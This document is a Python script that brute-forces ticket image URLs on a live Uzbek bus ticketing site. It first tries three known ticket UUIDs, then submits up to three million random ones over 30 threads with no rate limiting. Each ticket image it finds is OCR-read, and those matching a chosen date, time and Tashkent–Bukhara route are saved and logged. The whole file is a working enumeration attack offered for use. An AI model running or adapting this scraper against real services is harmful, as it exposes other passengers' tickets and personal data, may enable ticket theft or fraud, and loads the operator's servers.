import requests
import json
import uuid
import os
import time
from PIL import Image
from io import BytesIO
import pytesseract
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed

# === CONFIGURATION ===
TARGET_DATE = "2025-05-03"
TARGET_TIME = "22:30"
CITY_1 = "Toshkent"
CITY_2 = "Buxoro"
SAVE_FOLDER = "matched_tickets"
CSV_LOG = "matched_tickets_log.csv"
OCR_LANG = "eng+uzb"
MAX_ATTEMPTS = 3000000
THREADS = 30
SLEEP_TIME = 0.0
KNOWN_UUIDS = [
    "2a7e044b-f9a5-4e62-9910-bf850ac44e8f",
    "b2e4d73e-838b-4134-bb69-e0cd60bea569",
    "497c4340-f336-4c49-acf4-d6e7a6e8e276"
]

os.makedirs(SAVE_FOLDER, exist_ok=True)

# === OCR Ticket Content ===
def extract_text_from_image(image_data):
    try:
        image = Image.open(BytesIO(image_data))
        image = image.resize((image.width * 2, image.height * 2))
        text = pytesseract.image_to_string(image, lang=OCR_LANG, config='--psm 6')
        return text
    except Exception as e:
        print(f"[ERROR] OCR failed: {e}")
        return ""

# === Check Specific Ticket ===
def check_ticket(ticket_id):
    url = f"https://tickets.congresshall.avtotickets.uz/{ticket_id}.png"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print(f"[INFO] ✅ Ticket found: {ticket_id}")
            text = extract_text_from_image(response.content)

            with open("debug_ocr_log.txt", "a", encoding="utf-8") as debug_file:
                debug_file.write(f"--- {ticket_id} ---\n{text}\n\n")

            if TARGET_DATE in text and any(t in text for t in ["22:30", "22.30", "22: 30"]) and CITY_1 in text and CITY_2 in text:
                print(f"[MATCH] 🎯 Found ticket for {TARGET_DATE} {TARGET_TIME}")
                filename = os.path.join(SAVE_FOLDER, f"{ticket_id}.png")
                with open(filename, "wb") as f:
                    f.write(response.content)
                return (ticket_id, url, text.strip().replace("\n", " ")[:300])
            else:
                print("[INFO] Ticket does not match target time/date.")
        else:
            print(f"[SKIP] {ticket_id} not found (HTTP {response.status_code}).")
    except Exception as e:
        print(f"[ERROR] {e}")
    return None

# === MAIN ===
print(f"\n🎯 Scanning known UUIDs and random ones for: {TARGET_DATE} at {TARGET_TIME} from {CITY_1} to {CITY_2}")
matches = 0
results = []

with ThreadPoolExecutor(max_workers=THREADS) as executor:
    futures = []

    # Try known UUIDs first
    for ticket_id in KNOWN_UUIDS:
        futures.append(executor.submit(check_ticket, ticket_id))

    # Then try random UUIDs
    for _ in range(MAX_ATTEMPTS):
        ticket_id = str(uuid.uuid4())
        futures.append(executor.submit(check_ticket, ticket_id))
        time.sleep(SLEEP_TIME)

    for future in as_completed(futures):
        result = future.result()
        if result:
            results.append(result)
            matches += 1

with open(CSV_LOG, "w", newline="", encoding="utf-8") as csvfile:
    fieldnames = ["ticket_id", "url", "matched_text"]
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()
    for row in results:
        writer.writerow({
            "ticket_id": row[0],
            "url": row[1],
            "matched_text": row[2]
        })

print(f"\n✅ Finished. {matches} matching ticket(s) saved in '{SAVE_FOLDER}'. Logged in '{CSV_LOG}'.")
